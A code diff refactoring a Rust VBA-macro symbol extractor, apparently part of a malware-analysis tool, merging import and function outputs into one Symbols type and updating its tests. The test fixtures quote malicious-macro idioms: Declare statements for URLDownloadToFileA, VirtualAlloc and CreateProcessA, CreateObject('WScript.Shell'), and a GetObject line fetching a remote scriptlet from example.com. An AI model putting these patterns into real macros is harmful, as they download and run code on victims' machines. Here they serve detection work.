@@ -28,7 +28,7 @@
 use regex::Regex;
 use std::sync::OnceLock;
 
-use crate::output::{Function, Import};
+use crate::output::Symbol;
 
 /// Sentinel library/argument value emitted when a Declare's `Lib`
 /// clause or a CreateObject/GetObject argument is not a string
@@ -54,27 +54,21 @@ pub(crate) struct VbaSymbolStats {
 }
 
 /// Run the four extractors over one module's source. Pushes records
-/// into `imports_out` / `functions_out` and returns the per-module
-/// aggregate counters.
+/// into `symbols_out` and returns the per-module aggregate counters.
 ///
-/// Crate-internal: VBA symbols flow out to consumers through the
-/// unified [`crate::Imports`] / [`crate::Functions`] views populated
-/// by [`formats::vba::extract`], not through a public per-module
-/// function.
-pub(crate) fn extract(
-    source: &str,
-    imports_out: &mut crate::output::Imports,
-    functions_out: &mut crate::output::Functions,
-) -> VbaSymbolStats {
+/// Crate-internal: VBA symbols flow out through the unified
+/// [`crate::Symbols`] view populated by [`formats::vba::extract`],
+/// not through a public per-module function.
+pub(crate) fn extract(source: &str, symbols_out: &mut crate::output::Symbols) -> VbaSymbolStats {
     let mut stats = VbaSymbolStats::default();
     if source.is_empty() {
         return stats;
     }
     let prepared = preprocess(source);
-    extract_declares(&prepared, imports_out, &mut stats);
-    extract_createobject(&prepared, imports_out, &mut stats, false);
-    extract_createobject(&prepared, imports_out, &mut stats, true);
-    extract_subs_and_functions(&prepared, functions_out, &mut stats);
+    extract_declares(&prepared, symbols_out, &mut stats);
+    extract_createobject(&prepared, symbols_out, &mut stats, false);
+    extract_createobject(&prepared, symbols_out, &mut stats, true);
+    extract_subs_and_functions(&prepared, symbols_out, &mut stats);
     stats
 }
 
@@ -194,7 +188,7 @@ fn declare_re() -> &'static Regex {
 
 fn extract_declares(
     prep: &Prepared,
-    imports_out: &mut crate::output::Imports,
+    symbols_out: &mut crate::output::Symbols,
     stats: &mut VbaSymbolStats,
 ) {
     for cap in declare_re().captures_iter(&prep.text) {
@@ -224,10 +218,10 @@ fn extract_declares(
             .map(|m| prep.original_offset(m.start()))
             .unwrap_or(0) as u64;
 
-        imports_out.push(Import {
+        symbols_out.push(Symbol::Import {
             name: import_name,
             library: Some(lib_label),
-            source: "vba-declare",
+            source: "vba-declare".into(),
             offset: Some(offset),
             ordinal: None,
         });
@@ -271,7 +265,7 @@ fn getobject_re() -> &'static Regex {
 
 fn extract_createobject(
     prep: &Prepared,
-    imports_out: &mut crate::output::Imports,
+    symbols_out: &mut crate::output::Symbols,
     stats: &mut VbaSymbolStats,
     is_get: bool,
 ) {
@@ -322,10 +316,10 @@ fn extract_createobject(
             .get(0)
             .map(|m| prep.original_offset(m.start()))
             .unwrap_or(0) as u64;
-        imports_out.push(Import {
+        symbols_out.push(Symbol::Import {
             name: label,
             library: Some(lib_label.to_string()),
-            source: source_label,
+            source: source_label.into(),
             offset: Some(offset),
             ordinal: None,
         });
@@ -398,7 +392,7 @@ fn is_trigger_name(name: &str) -> bool {
 
 fn extract_subs_and_functions(
     prep: &Prepared,
-    functions_out: &mut crate::output::Functions,
+    symbols_out: &mut crate::output::Symbols,
     stats: &mut VbaSymbolStats,
 ) {
     // Skip names whose match start lies inside a Declare match —
@@ -428,23 +422,31 @@ fn extract_subs_and_functions(
             stats.trigger_handler_count = stats.trigger_handler_count.saturating_add(1);
         }
 
-        // Pike-style kind tag — distinguish `Sub` (no return value)
+        // Pike-style decl tag — distinguish `Sub` (no return value)
         // from `Function` so consumers don't have to lowercase /
         // string-compare.
-        let kind_tag: Option<&'static str> = if kind.eq_ignore_ascii_case("sub") {
-            Some("sub")
+        let decl = if kind.eq_ignore_ascii_case("sub") {
+            Some("sub".to_string())
         } else if kind.eq_ignore_ascii_case("function") {
-            Some("function")
+            Some("function".to_string())
         } else {
             None
         };
 
-        functions_out.push(Function {
+        symbols_out.push(Symbol::Function {
             name,
-            source: "vba-decl",
+            source: "vba-decl".into(),
             offset: Some(offset),
-            kind: kind_tag,
-            ..Function::default()
+            decl,
+            complexity: None,
+            basic_blocks: None,
+            edges: None,
+            instructions: None,
+            stack_frame: None,
+            recursive: None,
+            noreturn: None,
+            is_linear: None,
+            callees: Vec::new(),
         });
     }
 }
@@ -452,13 +454,35 @@ fn extract_subs_and_functions(
 #[cfg(test)]
 mod tests {
     use super::*;
-    use crate::output::{Functions, Imports};
+    use crate::output::{Symbols, SymbolKind};
 
-    fn run(src: &str) -> (Imports, Functions, VbaSymbolStats) {
-        let mut imports = Imports::new();
-        let mut functions = Functions::new();
-        let stats = extract(src, &mut imports, &mut functions);
-        (imports, functions, stats)
+    fn run(src: &str) -> (Symbols, VbaSymbolStats) {
+        let mut symbols = Symbols::new();
+        let stats = extract(src, &mut symbols);
+        (symbols, stats)
+    }
+
+    fn imports(s: &Symbols) -> Vec<(&str, Option<&str>, &str)> {
+        s.iter_kind(SymbolKind::Import)
+            .filter_map(|sym| match sym {
+                Symbol::Import {
+                    name,
+                    library,
+                    source,
+                    ..
+                } => Some((name.as_str(), library.as_deref(), source.as_str())),
+                _ => None,
+            })
+            .collect()
+    }
+
+    fn functions(s: &Symbols) -> Vec<&str> {
+        s.iter_kind(SymbolKind::Function)
+            .filter_map(|sym| match sym {
+                Symbol::Function { name, .. } => Some(name.as_str()),
+                _ => None,
+            })
+            .collect()
     }
 
     #[test]
@@ -467,12 +491,10 @@ mod tests {
             Declare PtrSafe Function vAlloc Lib "kernel32" Alias "VirtualAlloc" _
               (ByVal lpAddress As LongPtr) As LongPtr
         "#;
-        let (imp, _, stats) = run(src);
-        assert_eq!(imp.len(), 1);
-        let i = imp.iter().next().unwrap();
-        assert_eq!(i.name, "VirtualAlloc");
-        assert_eq!(i.library.as_deref(), Some("kernel32"));
-        assert_eq!(i.source, "vba-declare");
+        let (syms, stats) = run(src);
+        let imps = imports(&syms);
+        assert_eq!(imps.len(), 1);
+        assert_eq!(imps[0], ("VirtualAlloc", Some("kernel32"), "vba-declare"));
         assert_eq!(stats.declare_count, 1);
         assert_eq!(stats.declare_non_literal_count, 0);
     }
@@ -480,59 +502,59 @@ mod tests {
     #[test]
     fn declare_handles_case_whitespace_and_dll_suffix() {
         let src = "declare\tFunction\tLoadLibraryA\tlib \"KERNEL32.dll\"\t(s As String)\n";
-        let (imp, _, _) = run(src);
-        assert_eq!(imp.len(), 1);
-        let i = imp.iter().next().unwrap();
-        assert_eq!(i.name, "LoadLibraryA");
-        assert_eq!(i.library.as_deref(), Some("kernel32"));
+        let (syms, _) = run(src);
+        let imps = imports(&syms);
+        assert_eq!(imps.len(), 1);
+        assert_eq!(imps[0].0, "LoadLibraryA");
+        assert_eq!(imps[0].1, Some("kernel32"));
     }
 
     #[test]
     fn declare_with_line_continuation() {
         let src = "Declare PtrSafe Function f _\n  Lib \"urlmon\" _\n  Alias \"URLDownloadToFileA\" (a As Long)\n";
-        let (imp, _, _) = run(src);
-        assert_eq!(imp.len(), 1);
-        let i = imp.iter().next().unwrap();
-        assert_eq!(i.name, "URLDownloadToFileA");
-        assert_eq!(i.library.as_deref(), Some("urlmon"));
+        let (syms, _) = run(src);
+        let imps = imports(&syms);
+        assert_eq!(imps.len(), 1);
+        assert_eq!(imps[0].0, "URLDownloadToFileA");
+        assert_eq!(imps[0].1, Some("urlmon"));
     }
 
     #[test]
     fn declare_skips_apostrophe_comment_between_tokens() {
         let src = "Declare Function CreateProcessA _\n  ' comment that hides intent\n  Lib \"kernel32\" (a As Long)\n";
-        let (imp, _, _) = run(src);
-        assert_eq!(imp.len(), 1);
-        assert_eq!(imp.iter().next().unwrap().name, "CreateProcessA");
+        let (syms, _) = run(src);
+        let imps = imports(&syms);
+        assert_eq!(imps.len(), 1);
+        assert_eq!(imps[0].0, "CreateProcessA");
     }
 
     #[test]
     fn declare_with_non_literal_lib_emits_sentinel() {
         let src = r#"Declare Function f Lib dllName Alias "VirtualProtect" () As Long"#;
-        let (imp, _, stats) = run(src);
-        assert_eq!(imp.len(), 1);
-        let i = imp.iter().next().unwrap();
-        assert_eq!(i.name, "VirtualProtect");
-        assert_eq!(i.library.as_deref(), Some(NON_LITERAL_SENTINEL));
+        let (syms, stats) = run(src);
+        let imps = imports(&syms);
+        assert_eq!(imps.len(), 1);
+        assert_eq!(imps[0].0, "VirtualProtect");
+        assert_eq!(imps[0].1, Some(NON_LITERAL_SENTINEL));
         assert_eq!(stats.declare_non_literal_count, 1);
     }
 
     #[test]
     fn apostrophe_inside_string_literal_is_preserved() {
         let src = "x = \"it's fine\"\nDeclare Function K Lib \"kernel32\" (s As Long)\n";
-        let (imp, _, _) = run(src);
-        assert_eq!(imp.len(), 1);
-        assert_eq!(imp.iter().next().unwrap().name, "K");
+        let (syms, _) = run(src);
+        let imps = imports(&syms);
+        assert_eq!(imps.len(), 1);
+        assert_eq!(imps[0].0, "K");
     }
 
     #[test]
     fn createobject_literal_progid() {
         let src = r#"Set sh = CreateObject("WScript.Shell")"#;
-        let (imp, _, stats) = run(src);
-        assert_eq!(imp.len(), 1);
-        let i = imp.iter().next().unwrap();
-        assert_eq!(i.name, "WScript.Shell");
-        assert_eq!(i.library.as_deref(), Some("com"));
-        assert_eq!(i.source, "vba-createobject");
+        let (syms, stats) = run(src);
+        let imps = imports(&syms);
+        assert_eq!(imps.len(), 1);
+        assert_eq!(imps[0], ("WScript.Shell", Some("com"), "vba-createobject"));
         assert_eq!(stats.createobject_count, 1);
         assert_eq!(stats.createobject_non_literal_count, 0);
     }
@@ -540,36 +562,36 @@ mod tests {
     #[test]
     fn createobject_non_literal_arg() {
         let src = r#"Set x = CreateObject(progName & ".Sh" & "ell")"#;
-        let (imp, _, stats) = run(src);
-        assert_eq!(imp.len(), 1);
-        assert_eq!(imp.iter().next().unwrap().name, NON_LITERAL_SENTINEL);
+        let (syms, stats) = run(src);
+        let imps = imports(&syms);
+        assert_eq!(imps.len(), 1);
+        assert_eq!(imps[0].0, NON_LITERAL_SENTINEL);
         assert_eq!(stats.createobject_non_literal_count, 1);
     }
 
     #[test]
     fn getobject_two_arg_form_yields_progid_only() {
         let src = r#"Set xl = GetObject("c:\book.xls", "Excel.Application")"#;
-        let (imp, _, stats) = run(src);
-        assert_eq!(imp.len(), 1);
-        let i = imp.iter().next().unwrap();
-        assert_eq!(i.name, "Excel.Application");
-        assert_eq!(i.library.as_deref(), Some("com-getobject"));
+        let (syms, stats) = run(src);
+        let imps = imports(&syms);
+        assert_eq!(imps.len(), 1);
+        assert_eq!(imps[0], ("Excel.Application", Some("com-getobject"), "vba-getobject"));
         assert_eq!(stats.getobject_count, 1);
     }
 
     #[test]
     fn getobject_one_arg_emits_no_symbol() {
         let src = r#"Set f = GetObject("script:http://example.com/payload.sct")"#;
-        let (imp, _, stats) = run(src);
-        assert_eq!(imp.len(), 0);
+        let (syms, stats) = run(src);
+        assert_eq!(imports(&syms).len(), 0);
         assert_eq!(stats.getobject_count, 1);
     }
 
     #[test]
     fn sub_function_declarations_extracted_excluding_declare() {
         let src = "Public Sub Document_Open()\nEnd Sub\n\nPrivate Function helper(x)\nEnd Function\n\nDeclare Function notAFunction Lib \"k32\" () As Long\n";
-        let (_, funcs, stats) = run(src);
-        let names: Vec<&str> = funcs.iter().map(|f| f.name.as_str()).collect();
+        let (syms, stats) = run(src);
+        let names = functions(&syms);
         assert!(names.contains(&"Document_Open"));
         assert!(names.contains(&"helper"));
         assert!(!names.contains(&"notAFunction"));
@@ -580,23 +602,23 @@ mod tests {
     fn trigger_handler_count_aggregates_distinct_triggers() {
         let src =
             "Sub Document_Open()\nEnd Sub\nSub Workbook_Open()\nEnd Sub\nSub helper()\nEnd Sub\n";
-        let (_, _, stats) = run(src);
+        let (_, stats) = run(src);
         assert_eq!(stats.trigger_handler_count, 2);
     }
 
     #[test]
     fn rem_comment_line_is_stripped() {
         let src = "Rem Declare Function fake Lib \"x\" ()\nDeclare Function real Lib \"k32\" () As Long\n";
-        let (imp, _, _) = run(src);
-        assert_eq!(imp.len(), 1);
-        assert_eq!(imp.iter().next().unwrap().name, "real");
+        let (syms, _) = run(src);
+        let imps = imports(&syms);
+        assert_eq!(imps.len(), 1);
+        assert_eq!(imps[0].0, "real");
     }
 
     #[test]
     fn empty_source_returns_zero_stats() {
-        let (imp, funcs, stats) = run("");
-        assert!(imp.is_empty());
-        assert!(funcs.is_empty());
+        let (syms, stats) = run("");
+        assert!(syms.is_empty());
         assert_eq!(stats.declare_count, 0);
     }
 }
